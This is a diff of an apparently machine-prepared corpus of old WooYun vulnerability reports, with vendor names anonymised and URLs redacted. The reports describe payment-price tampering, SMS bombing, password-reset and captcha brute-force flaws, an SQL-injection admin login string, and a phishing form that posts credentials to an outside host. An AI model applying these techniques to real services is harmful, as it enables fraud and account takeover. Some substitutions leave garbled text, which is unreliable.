+**详情**: 端午节快乐哈。说明下：这是个bug，不是安全漏洞(如果围观者为了看漏洞，那请移步吧...(^__^))，但关系到用户账号和业务逻辑，加上一个宅男节日无事做，再加上是某互联网公司的铁杆用户，so...提交到wooyun吧。入正题：再次发送手机短信验证码；验证手机时；未将上次所发的验证码销毁。https://example.com/[已脱敏])；
 
 **POC**: 给出了短信验证码只能使用一次的提示多次发送后输入45分的验证码验证成功PS：写的太详细了，有点罗嗦，哈哈。
 
@@ -7133,8 +7133,8 @@
 ---
 
 ---
-### [wooyun-2012-05874] 腾讯业务交叉逻辑考虑不周导致QQ空间CSRF漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-05874] 某互联网公司业务交叉逻辑考虑不周导致某互联网公司空间CSRF漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -7145,9 +7145,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ空间支持从邮箱中以邮件的方式发送文章到QQ空间，由于在邮箱中和QQ空间中的业务不同，因此对某些细节的处理不同，而这种交叉，导致在QQ空间中苦苦做的限制白做了。打开QQ的记事本，写一个新的记事，插入一张图片插入后保存，点右上角的发送到Qzone。这一文章便已被发送到了QQ空间。
+**详情**: 某互联网公司空间支持从邮箱中以邮件的方式发送文章到某互联网公司空间，由于在邮箱中和某互联网公司空间中的业务不同，因此对某些细节的处理不同，而这种交叉，导致在某互联网公司空间中苦苦做的限制白做了。打开某互联网公司的记事本，写一个新的记事，插入一张图片插入后保存，点右上角的发送到Qzone。这一文章便已被发送到了某互联网公司空间。
 
-**POC**: 在他人打开浏览的时候，就会在不知情的情况下，自动访问www.nigesb.com，造成CSRF，QQ空间中，是不允许插入这样的图片链接的。wireshark抓包，证明，确实访问了我的博客。而且QQ空间新发文章，是会出现在好友的动态的timeline中的哟。
+**POC**: 在他人打开浏览的时候，就会在不知情的情况下，自动访问www.nigesb.com，造成CSRF，某互联网公司空间中，是不允许插入这样的图片链接的。wireshark抓包，证明，确实访问了我的博客。而且某互联网公司空间新发文章，是会出现在好友的动态的timeline中的哟。
 
 **绕过**: 直接利用
 
@@ -7211,9 +7211,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 站点：http://2.suning.com
+**详情**: 站点：https://example.com/[已脱敏]
 
-**POC**: http://2.suning.com/getItemDetail/6031223438/144108641958843738.htm是个苹果表访问链接http://2.suning.com/seller/takeoff.do?itemCode=144108641958843738&_=1441184836932正常情况下放回 1 表示成功 -1表示失败可以遍历页面所有物件id， 然后逐个让他下线 ，是不是 整个站就废了？
+**POC**: https://example.com/[已脱敏] 1 表示成功 -1表示失败可以遍历页面所有物件id， 然后逐个让他下线 ，是不是 整个站就废了？
 
 **绕过**: 直接利用
 
@@ -7221,7 +7221,7 @@
 ---
 
 ---
-### [wooyun-2015-0130799] 鲜达网微信水果接龙1元活动存在逻辑缺陷漏洞
+### [wooyun-2015-0130799] 鲜达网某互联网公司水果接龙1元活动存在逻辑缺陷漏洞
 **厂商**: 鲜果网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 参数注入
@@ -7233,7 +7233,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 鲜达网官网http://www.xianda365.com/1、首先了解一下鲜达网的活动，“每人每天仅限一箱”2、微信访问鲜达网水果接龙3、选择1元活动购买金红宝蜜瓜，此活动每人限一次，先来一箱试试4、再买一箱试试，提示已经参加活动5、再试一次，并抓其请求报文和响应Unicode编码，转换为中文5、如何突破限制，再买一箱呢？分析可以知道，再选择买一箱时，传送的报文只有一个Cookie里参数CAKEPHP，由此，可以判断服务器根据CAKEPHP是否已经购买过。因此，修改此值即可突破限制，下面试试。6、修改自己的Cookie，任意值，获取响应报文，提示成功
+**详情**: 鲜达网官网https://example.com/[已脱敏]
 
 **POC**: 7、赶紧下订单、支付没有任何阻碍、验证，下单成功！！！本人虽然多得一箱水果，但真的没有恶意，后面一箱水果算是送我了。。。谢谢喽
 
@@ -7261,12 +7261,12 @@
 
 **绕过**: 直接利用
 
-**修复**: 后来测试发现，京东除了登陆的时候HTTPS加密传输，其他的几乎都是HTTP传输，返回数据都是简单编码，升级最好对升级的链接啊、apk包啊，进行校验..觉得最最的安全点在于：1.升级的链接为HTTP协议传输，攻击容易；2.返回数据的编码形式..
+**修复**: 后来测试发现，某电商平台除了登陆的时候HTTPS加密传输，其他的几乎都是HTTP传输，返回数据都是简单编码，升级最好对升级的链接啊、apk包啊，进行校验..觉得最最的安全点在于：1.升级的链接为HTTP协议传输，攻击容易；2.返回数据的编码形式..
 ---
 
 ---
-### [wooyun-2014-065814] 精心构造BT种子可对QQ旋风进行拒绝服务攻击
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-065814] 精心构造BT种子可对某互联网公司旋风进行拒绝服务攻击
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -7277,9 +7277,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 构造下BT种子，用QQ旋风打开直接崩溃，再次打开再次崩溃，屡试不爽~
+**详情**: 构造下BT种子，用某互联网公司旋风打开直接崩溃，再次打开再次崩溃，屡试不爽~
 
-**POC**: 样本呢本来传到了应急响应中心的，就这里咯~其实我也不知道哪里有逻辑问题啊哈哈哈哈哈顺带提一下，电脑是xpsp3，用了360，哦呵呵呵呵= =http://wydrops-wordpress.stor.sinaapp.com/uploads/2014/06/test.zip很奇怪乌云为毛不能传附件= =
+**POC**: 样本呢本来传到了应急响应中心的，就这里咯~其实我也不知道哪里有逻辑问题啊哈哈哈哈哈顺带提一下，电脑是xpsp3，用了360，哦呵呵呵呵= =https://example.com/[已脱敏] =
 
 **绕过**: 直接利用
 
@@ -7299,9 +7299,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.正常的支付流程注册好豆丁网帐号之后 进入开通vip服务：http://www.docin.com/app/jump_adv/pay_vip.do?channelid=0313&buyVipFrom=4选择需要开通的月份 点击立即开通选择付款方式 点击确认付款跳转到支付宝付款页面 支付完成就行2.跳过支付流程以上是正常的支付流程，关键是第2步，选择开通的月份为6个月vip，不要点立即开通这里用到的工具是fiddle  设置f11好拦截数据进行抓包，点击立即开通 确认支付 点击确认之后工具左侧出现拦截的网址数据，双击进去，右侧选项卡选择webforms，只要把vip-type后面的数值（月数）改成大于6以上的数据（小于6未做测试），鼠标点击左栏下方红色箭头两下，释放数据。然后点击右下侧绿色run to ... 网页即可自动跳转到已购买页面，并且显示购买到期时间。
+**详情**: 1.正常的支付流程注册好豆丁网帐号之后 进入开通vip服务：https://example.com/[已脱敏] 点击立即开通选择付款方式 点击确认付款跳转到某电商平台付款页面 支付完成就行2.跳过支付流程以上是正常的支付流程，关键是第2步，选择开通的月份为6个月vip，不要点立即开通这里用到的工具是fiddle  设置f11好拦截数据进行抓包，点击立即开通 确认支付 点击确认之后工具左侧出现拦截的网址数据，双击进去，右侧选项卡选择webforms，只要把vip-type后面的数值（月数）改成大于6以上的数据（小于6未做测试），鼠标点击左栏下方红色箭头两下，释放数据。然后点击右下侧绿色run to ... 网页即可自动跳转到已购买页面，并且显示购买到期时间。
 
-**POC**: 豆丁网http://www.docin.com新注册个帐号qwe921234 密码a121212进入vip购买服务fiddle设置好拦截数据 点击确认付款然后修改拦截后的数据 月份为120个月 即为10年然后释放拦截数据再点击run to... 网页直接跳转到http://www.docin.com/app/my/caseVip显示自己的vip时长这是账单明细
+**POC**: 豆丁网https://example.com/[已脱敏] 密码a121212进入vip购买服务fiddle设置好拦截数据 点击确认付款然后修改拦截后的数据 月份为120个月 即为10年然后释放拦截数据再点击run to... 网页直接跳转到https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7310,7 +7310,7 @@
 
 ---
 ### [wooyun-2015-0148953] 某移动校讯通设计逻辑缺陷可重置用户密码
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -7353,8 +7353,8 @@
 ---
 
 ---
-### [wooyun-2012-05822] QQ邮箱日历功能导致IE假死
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-05822] 某互联网公司邮箱日历功能导致IE假死
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -7365,7 +7365,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 进入QQ邮箱选择日历中的“月”，IE立马卡死。cpu占满。
+**详情**: 进入某互联网公司邮箱选择日历中的“月”，IE立马卡死。cpu占满。
 
 **POC**: 其他2项正常！在谷歌浏览器和火狐浏览器下正常。
 
@@ -7419,8 +7419,8 @@
 ---
 
 ---
-### [wooyun-2013-023928] 腾讯的qq浏览器ios版貌似根本就不验证SSL证书啊
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-023928] 某互联网公司的某互联网公司浏览器ios版貌似根本就不验证SSL证书啊
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -7433,7 +7433,7 @@
 
 **详情**: 如题
 
-**POC**: 在麦当劳wifi未登录时测试，wifi会自动把80的http和443的https劫持到登录页面看见没有...再拿腾讯最重视其安全性的tenpay(证书都用的是ev ssl)试一下先在safari里打开点击OK看见没有，连自家支付的安全都不重视了...还QQ浏览器的安全支持？安全个P
+**POC**: 在麦当劳wifi未登录时测试，wifi会自动把80的http和443的https劫持到登录页面看见没有...再拿某互联网公司最重视其安全性的tenpay(证书都用的是ev ssl)试一下先在safari里打开点击OK看见没有，连自家支付的安全都不重视了...还某互联网公司浏览器的安全支持？安全个P
 
 **绕过**: 直接利用
 
@@ -7442,7 +7442,7 @@
 
 ---
 ### [wooyun-2014-077795] 有道云笔记3.9.5.1版本存在执行任意js脚本漏洞
-**厂商**: 网易 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -7497,7 +7497,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题站点：m.winenice.com1.我们找到一瓶比较贵的酒，嗯，这个不错，899；2.点击加入购物车并抓包，发现是个GET请求，且在url中包含了商品的价格price；http://m.winenice.com/Product/Add_Car.aspx?ProductCode=ag000027&ProductName=%e5%93%a5%e7%bd%97%e9%87%8c%e5%a5%a5%e7%9a%87%e5%86%a0%e9%be%99%e8%88%8c%e5%85%b0%e9%85%92&Price=899.03.将Price参数值修改为8.99并提交，系统未二次校验；4.填写收获信息就成功提交订单；5.返回页面查看刚刚生成的订单；
+**详情**: 问题站点：m.winenice.com1.我们找到一瓶比较贵的酒，嗯，这个不错，899；2.点击加入购物车并抓包，发现是个GET请求，且在url中包含了商品的价格price；https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -7519,7 +7519,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微信端 中国人寿山东点击国寿连接-员工/营销员绑定然后到达登陆页面 需要我们输入8位或者14位的员工号我就用13200000进行测试 然后点击获取验证码点击登陆 然后抓包POST /weixin/empbind/save HTTP/1.1Host: sdapp.e-chinalife.comAccept-Language: zh-cnUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143 MicroMessenger/6.2.4 NetType/WIFI Language/zh_CNAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/
+**详情**: 某互联网公司端 中国人寿山东点击国寿连接-员工/营销员绑定然后到达登陆页面 需要我们输入8位或者14位的员工号我就用13200000进行测试 然后点击获取验证码点击登陆 然后抓包POST /weixin/empbind/save HTTP/1.1Host: sdapp.e-chinalife.comAccept-Language: zh-cnUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143 MicroMessenger/6.2.4 NetType/WIFI Language/zh_CNAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/
 
 **POC**: 分分钟成功
 
@@ -7563,7 +7563,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: EMS用户登录处，由于验证码逻辑存在问题，可导致暴力破解注册用户账户信息，可以查看破解账户的手机，地址等敏感信息，也可以网上下单用户登录后台http://**.**.**.**/ec-web/toGoLogin.action找回密码地址http://**.**.**.**/ec-web/findPassword/findPasswordOne.action在找回密码地方，由于没有验证码机制，可以暴力猜测注册用户账号。用了一个小字典测试，发现了以下几个账户 test，qqqqq，test2，qwe321，test1。得到账户之后，在用户登录地方进行无视验证码暴力破解。
+**详情**: EMS用户登录处，由于验证码逻辑存在问题，可导致暴力破解注册用户账户信息，可以查看破解账户的手机，地址等敏感信息，也可以网上下单用户登录后台http://**.**.**.**/ec-web/toGoLogin.action找回密码地址http://**.**.**.**/ec-web/findPassword/findPasswordOne.action在找回密码地方，由于没有验证码机制，可以暴力猜测注册用户账号。用了一个小字典测试，发现了以下几个账户 test，某互联网公司某互联网公司q，test2，qwe321，test1。得到账户之后，在用户登录地方进行无视验证码暴力破解。
 
 **POC**: email亮了。。。
 
@@ -7585,7 +7585,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: APP名称：小达APP地址：http://uuask.com/index.htmlAPP漏洞简介：短信验证码明文返回。导致可以批量注册任意手机号，可以重置任意手机号密码。
+**详情**: APP名称：小达APP地址：https://example.com/[已脱敏]
 
 **POC**: 1，随便填写一个手机号注册2，忘记密码同理，调用的是同一个接口
 
@@ -7607,9 +7607,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.求医网，是国内较大的医疗门户站点，网址http://www.qiuyi.cn/。2.医生和医院可以自行注册，其中注册会员可以通过回答问题等途径获取积分。3.积分可以按照10:1兑换为人民币，比如1000积分可以兑换100人民币，后台可以直接兑换。4.求医网密码取回功能出现严重的漏洞，只要输入用户名和注册邮箱就可以充值密码，密码默认是123456.全部用户都是。5.获取到用户名和注册的邮箱后，就可以随便修改他人的密码，以初始密码123456登录后台，如果后台有积分，那么还可以直接兑换为人民币。6.其他比如修改用户，医生，医院的信息等。7.由于密码漏洞造成很多客户资料可以被修改。8.最明显的泄漏用户信息的地方是：http://www.qiuyi.cn/jifen。积分栏目排行榜可以看到用户完整的邮箱，基本可以根据前面提示的用户名前三位猜测到密码，进而通过密码修改漏洞，进而获取用户信息，修改
+**详情**: 1.求医网，是国内较大的医疗门户站点，网址https://example.com/[已脱敏]
 
-**POC**: 1.http://www.qiuyi.cn/jifen进入栏目可以看到很多用户名和注册邮箱，根据人的常规习惯，可以获取到完整的用户名或者用软件通过注册处的系统用户名校验功能猜测出来，具体不演示，太弱智。2.通过获取的用户名和邮箱，在取回密码处，http://www.qiuyi.cn/login/getpass，输入取回密码。这时修改后的充值密码信件会发到原始邮箱，默认密码是123456.3.用用户名和默认密码（不管你是否收到邮件，密码都是默认的123456），登录后台，直接修改用户字的邮箱和其他的为自己的，修改密码为自己的。4.如果用户后台有积分，可以直接兑换为人民币。其余部分不再演示。5.至
+**POC**: 1.https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7629,9 +7629,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我不详细说了，直接上图说明。http://211.103.239.83:8090/tb/login.jsp输入admin/admin，直接进入。可查看到92万多条游客的身份证号从页面统计上看有92510个页面，每个页面有10人的身份信息，推论之，泄露了92万多（925100）条个人信息。同时，也存在业务逻辑错误——可以抢注游客的预约。选择某个游客预约信息，选择“查看”选择“修改”选择“保存”，可以看到预约号还是原来的、身份证号却变成了抢注游客的了，这里就不上图了，我亲自实验过。就这样，原始游客的预约信息被抢注游客更新了。理论上，抢注者可以堂而皇之地拿着他的身份证选择任何一天去北京自然博物馆游玩了，不受任何限制！！！
+**详情**: 我不详细说了，直接上图说明。http://[IP已脱敏]
 
-**POC**: 我不详细说了，直接上图说明。http://211.103.239.83:8090/tb/login.jsp输入admin/admin，直接进入。可查看到92万多条游客的身份证号从页面统计上看有92510个页面，每个页面有10人的身份信息，推论之，泄露了92万多（925100）条个人信息。同时，也存在业务逻辑错误——可以抢注游客的预约。选择某个游客预约信息，选择“查看”选择“修改”选择“保存”，可以看到预约号还是原来的、身份证号却变成了抢注游客的了，这里就不上图了，我亲自实验过。就这样，原始游客的预约信息被抢注游客更新了。理论上，抢注者可以堂而皇之地拿着他的身份证选择任何一天去北京自然博物馆游玩
+**POC**: 我不详细说了，直接上图说明。http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -7741,7 +7741,7 @@
 
 **详情**: 漏洞信息详情会提前泄漏一部分给公众，而且有些信息是相当严重的漏洞细节信息。会危害未公开漏洞的网站的安全。风险比较高。希望乌云尽快修复。
 
-**POC**: http://www.wooyun.org/feeds/hot 这个feed泄漏了部分暂未公开的详细信息。<rss version="2.0"><channel><title>wooyun.org 最新热点漏洞</title><link>http://www.wooyun.org</link><ttl>5</ttl><description>wooyun.org</description><language>zh-cn</language><generator>www.wooyun.org</generator><webmaster>webmaster@wooyun.org</webmaste
+**POC**: https://example.com/[已脱敏] 这个feed泄漏了部分暂未公开的详细信息。<rss version="2.0"><channel><title>wooyun.org 最新热点漏洞</title><link>https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7749,8 +7749,8 @@
 ---
 
 ---
-### [wooyun-2013-038772] 中国移动主站某处验证绕过可进行短信轰炸
-**厂商**: 中国移动 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-038772] 某运营商主站某处验证绕过可进行短信轰炸
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -7761,7 +7761,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.10086.cn/support/focus/suggest/index.htm获取短信验证码时仅仅是前端验证，用burpsuite抓包，send to repeater~前端限制是180秒内只能发一条验证码到同一个手机号，用burp直接post，可以几秒钟之内给同一个号码发10条。(超过10条就不行了上手机截图
+**详情**: https://example.com/[已脱敏] to repeater~前端限制是180秒内只能发一条验证码到同一个手机号，用burp直接post，可以几秒钟之内给同一个号码发10条。(超过10条就不行了上手机截图
 
 **POC**: (见原文)
 
@@ -7827,7 +7827,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.tootoo.cn/在向支付宝提交参数过程中未校验商品金额，导致随意修改。作为同行表示很无奈。。。。。。随意放入购物车几个物品提交订单选择支付宝支付 其他的我没测。。。你们自己看看吧提交订单，选择立即支付，抓包开始了修改参数之后一定，修改参数之后浏览器会停在一个界面先别点东西先把代理关了再继续点击高级然后点击继续访问OK了，1元买了两栏草莓嘎嘎。。。。
+**详情**: https://example.com/[已脱敏] 其他的我没测。。。你们自己看看吧提交订单，选择立即支付，抓包开始了修改参数之后一定，修改参数之后浏览器会停在一个界面先别点东西先把代理关了再继续点击高级然后点击继续访问OK了，1元买了两栏草莓嘎嘎。。。。
 
 **POC**: (见原文)
 
@@ -7849,9 +7849,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址http://58.56.128.21/sendmessage/存在注入，但是跑不动，手注麻烦，所以万能密码进后台看看admin' or '1'='1admin' or '1'='1成功进入可以自己添加单个号码（可做短信轰炸机哦）危害更大的在下面点击导出历史记录，会下载一个表格然后改成html后缀方便看，不看不知道，一看吓一跳，各种敏感信息泄露，什么招标啊，等等，就随意贴几张图可见系统一直在使用各种信息
+**详情**: 漏洞地址http://[IP已脱敏] or '1'='1admin' or '1'='1成功进入可以自己添加单个号码（可做短信轰炸机哦）危害更大的在下面点击导出历史记录，会下载一个表格然后改成html后缀方便看，不看不知道，一看吓一跳，各种敏感信息泄露，什么招标啊，等等，就随意贴几张图可见系统一直在使用各种信息
 
-**POC**: 漏洞地址http://58.56.128.21/sendmessage/存在注入，但是跑不动，手注麻烦，所以万能密码进后台看看admin' or '1'='1admin' or '1'='1成功进入可以自己添加单个号码（可做短信轰炸机哦）危害更大的在下面点击导出历史记录，会下载一个表格然后改成html后缀方便看，不看不知道，一看吓一跳，各种敏感信息泄露，什么招标啊，等等，就随意贴几张图可见系统一直在使用各种信息
+**POC**: 漏洞地址http://[IP已脱敏] or '1'='1admin' or '1'='1成功进入可以自己添加单个号码（可做短信轰炸机哦）危害更大的在下面点击导出历史记录，会下载一个表格然后改成html后缀方便看，不看不知道，一看吓一跳，各种敏感信息泄露，什么招标啊，等等，就随意贴几张图可见系统一直在使用各种信息
 
 **绕过**: 直接利用
 
@@ -7859,8 +7859,8 @@
 ---
 
 ---
-### [wooyun-2011-01940] 淘宝货到付款骗局
-**厂商**: 淘宝网 | **年份**: 2011 | **类型**: 钓鱼欺诈信息
+### [wooyun-2011-01940] 某电商平台货到付款骗局
+**厂商**: 某电商平台网 | **年份**: 2011 | **类型**: 钓鱼欺诈信息
 
 **元思考**: 触发信号: 功能测试
 
@@ -7871,7 +7871,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 诈骗流程：1.吸引买家骗子卖家首先利用低价吸引买家。2.货到付款买家拍下商品后，骗子联系买家编造种种理由要求买家选择货到付款模式。3.下线货到付款，线上不发货绕过淘宝信用评价机制卖家通过货到付款，使用仿造的假货通过快递货到付款业务收到买家的钱。而淘宝网上订单一直保持在“等待卖家发货”状态。而“等待卖家发货”状态下，用户是不能评价，也不能维权的。这样就形成了实际利用淘宝完成了交易，但网上状态是未完成交易，买家无法评价和维权，也就完美的绕过了淘宝的信用评价机制。这种状态下唯一的维权方式是消费者热线：0571-85026880，但淘宝消费者热线非工作时间禁止呼叫，工作时间永远占线。所谓细节决定成败。整个诈骗流程中，骗子利用了很多细节：1. 卖家好评100%利用买家认为好评100%的新卖家最害怕差评的心理，赢取信任。2. 签署淘宝《消费者保障服务协议》，并交保证金卖家加入淘宝的店铺保障服务，提供”
+**详情**: 诈骗流程：1.吸引买家骗子卖家首先利用低价吸引买家。2.货到付款买家拍下商品后，骗子联系买家编造种种理由要求买家选择货到付款模式。3.下线货到付款，线上不发货绕过某电商平台信用评价机制卖家通过货到付款，使用仿造的假货通过快递货到付款业务收到买家的钱。而某电商平台网上订单一直保持在“等待卖家发货”状态。而“等待卖家发货”状态下，用户是不能评价，也不能维权的。这样就形成了实际利用某电商平台完成了交易，但网上状态是未完成交易，买家无法评价和维权，也就完美的绕过了某电商平台的信用评价机制。这种状态下唯一的维权方式是消费者热线：0571-85026880，但某电商平台消费者热线非工作时间禁止呼叫，工作时间永远占线。所谓细节决定成败。整个诈骗流程中，骗子利用了很多细节：1. 卖家好评100%利用买家认为好评100%的新卖家最害怕差评的心理，赢取信任。2. 签署某电商平台《消费者保障服务协议》，并交保证金卖家加入某电商平台的店铺保障服务，提供”
 
 **POC**: 骗子似乎已经疯了~~~
 
@@ -7893,7 +7893,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 站点：http://ideaclub.lenovo.com.cn/club/联想会员俱乐部。积分商城存在支付漏洞，可以扣负分，可以无限刷分。在积分商城随意兑换一个东西抓包把数量修改成负数，或者修改价格。修改数量可以刷积分，修改价格可以扣成负分。修改价格：修改数量把分刷回来。这个应该是会发货的，因为看论坛有定期的发货通知哟，
+**详情**: 站点：https://example.com/[已脱敏]
 
 **POC**: 见详细说明。
 
@@ -7925,8 +7925,8 @@
 ---
 
 ---
-### [wooyun-2012-014456] Iphone QQ手势密码绕过登陆
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-014456] Iphone 某互联网公司手势密码绕过登陆
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -7937,7 +7937,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 创建完手势密码之后返回桌面再进入QQ即被锁定,此时输入五次错误的手势将会提示需要输入QQ密码来安全登陆，这时按HOME返回桌面再次进入QQ会发现又可以输手势密码并且左上角多出一个设置按钮点进去之后就绕过了手势密码进去了，然而手势密码的数据也就被清除了！
+**详情**: 创建完手势密码之后返回桌面再进入某互联网公司即被锁定,此时输入五次错误的手势将会提示需要输入某互联网公司密码来安全登陆，这时按HOME返回桌面再次进入某互联网公司会发现又可以输手势密码并且左上角多出一个设置按钮点进去之后就绕过了手势密码进去了，然而手势密码的数据也就被清除了！
 
 **POC**: (见原文)
 
@@ -8005,7 +8005,7 @@
 
 **详情**: 浏览器执行逻辑，猜的1=》 打开页面之后，window.location.href变化，或者window.location.replace改变了window.location2=》浏览器检测到window.location变化的事件，修改地址栏为新的window.location3=》发送请求到新的window.location，但是window.location太长，导致dll MxResMgr.dll函数失去响应，但是主程序依旧显示出了网页内容 （2，3造成了内容欺骗）4=》此时发出改变window.location的请求发生阻塞，如果window.location不变化，60秒后没有监听到服务器返回的代码，另外一个函数就会显示“页面请求超时”5=》大约120秒后浏览器崩溃，拒绝服务
 
-**POC**: 打开以下页面，伪造成功执行?<html><head><h1>请在此输入你的帐号和密码</h1><form action="http://luc.pw/test.php" method="post">username:<input type="text" id="u"><br/>pw:<input type="text" id="p"><input type="submit" id="s"></form><script type="text/javascript">function mul(str,count){if(count==0) return '';var binaryCount = c
+**POC**: 打开以下页面，伪造成功执行?<html><head><h1>请在此输入你的帐号和密码</h1><form action="https://example.com/[已脱敏]" method="post">username:<input type="text" id="u"><br/>pw:<input type="text" id="p"><input type="submit" id="s"></form><script type="text/javascript">function mul(str,count){if(count==0) return '';var binaryCount = c
 
 **绕过**: 直接利用
 
@@ -8071,7 +8071,7 @@
 
 **详情**: 第一个方法重置密码，会被发现。第二个方法是第一个的升级版，需要传走文件，但不会重置目标的密码。简要说明，1.接触目标手机，2.清除密码(跳转到4)或传走加密文件，3.在自己手机清除密码，4.欣赏视频。
 
-**POC**: 第一招本人比较健忘也爱设奇葩的密码，，暴风影音私人收藏密码忘了自己都猜不出来 。。求助客服无果后，只好自己探索。第二招然后告诉了客服希望有找回密码和补上这个缺陷，，过了很久以后还是这样，，于是有了机会继续探索这个缺陷。话说，加密视频这么大的玩意不存手机里存哪去？于是开始翻找文件夹，果然找到了，隐蔽文件夹.baofengtemp赶紧把文件传到朋友手机相同目录去(本人安卓2.3，盆友4.3，屌丝伤不起。)再让朋友打开私人收藏，，看来暴风影音已经料到了这招。既然之前一招能奏效，那么这里能否套用一下？果然成功了。送上我测试的文件，顺便说下这视频挺有趣的，，http://yunpan.cn/Q4tIZm
+**POC**: 第一招本人比较健忘也爱设奇葩的密码，，暴风影音私人收藏密码忘了自己都猜不出来 。。求助客服无果后，只好自己探索。第二招然后告诉了客服希望有找回密码和补上这个缺陷，，过了很久以后还是这样，，于是有了机会继续探索这个缺陷。话说，加密视频这么大的玩意不存手机里存哪去？于是开始翻找文件夹，果然找到了，隐蔽文件夹.baofengtemp赶紧把文件传到朋友手机相同目录去(本人安卓2.3，盆友4.3，屌丝伤不起。)再让朋友打开私人收藏，，看来暴风影音已经料到了这招。既然之前一招能奏效，那么这里能否套用一下？果然成功了。送上我测试的文件，顺便说下这视频挺有趣的，，https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8093,7 +8093,7 @@
 
 **详情**: 抱着被忽略的心态来提交   ~~~~(>_<)~~~~  大部分的支付漏洞都被忽略了
 
-**POC**: 首先我们去盛大旗下的果壳电子选购一件商品http://www.igeak.com/然后输入收货信息结算，抓包，发现是get型，把productID这个参数改为 -1然后填写收获地址之后提交，继续截断再把money这个参数改成一个正数 如1订单提交成功，支付宝等于0，无法支付，没关系，有货到付款OK  订单完成
+**POC**: 首先我们去盛大旗下的果壳电子选购一件商品https://example.com/[已脱敏] -1然后填写收获地址之后提交，继续截断再把money这个参数改成一个正数 如1订单提交成功，某电商平台等于0，无法支付，没关系，有货到付款OK  订单完成
 
 **绕过**: 直接利用
 
@@ -8113,7 +8113,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 宜信旗下的宜信保险子站，网址http://www.yixinbaoxian.com/在选择相应保险后，修改价格标签value值，则可以直接修改订单价格！支付时仍会按照修改后的价格进行支付，是重大漏洞。步骤:1:打开产品超市（以e时代交通工具保障计划为例），选择立即购买2：条款选择下一步3：投保信息中，保费金额为只读项，其代码为<input type="text" data-x-vfmt="^\d+$" placeholder="此项自动计算" title="此项自动计算" name="i149b3e6ab66" id="i149b3e6ab66" readonly="">使用firebug或其他调试工具，去掉readonly属性，修改为你想要的任意金额，比如1元，点击下一步4：支付时已经变成你想要的价格了！
+**详情**: 宜信旗下的宜信保险子站，网址https://example.com/[已脱敏] type="text" data-x-vfmt="^\d+$" placeholder="此项自动计算" title="此项自动计算" name="i149b3e6ab66" id="i149b3e6ab66" readonly="">使用firebug或其他调试工具，去掉readonly属性，修改为你想要的任意金额，比如1元，点击下一步4：支付时已经变成你想要的价格了！
 
 **POC**: (见原文)
 
@@ -8123,8 +8123,8 @@
 ---
 
 ---
-### [wooyun-2015-090799] 百度云加速防御规则绕过
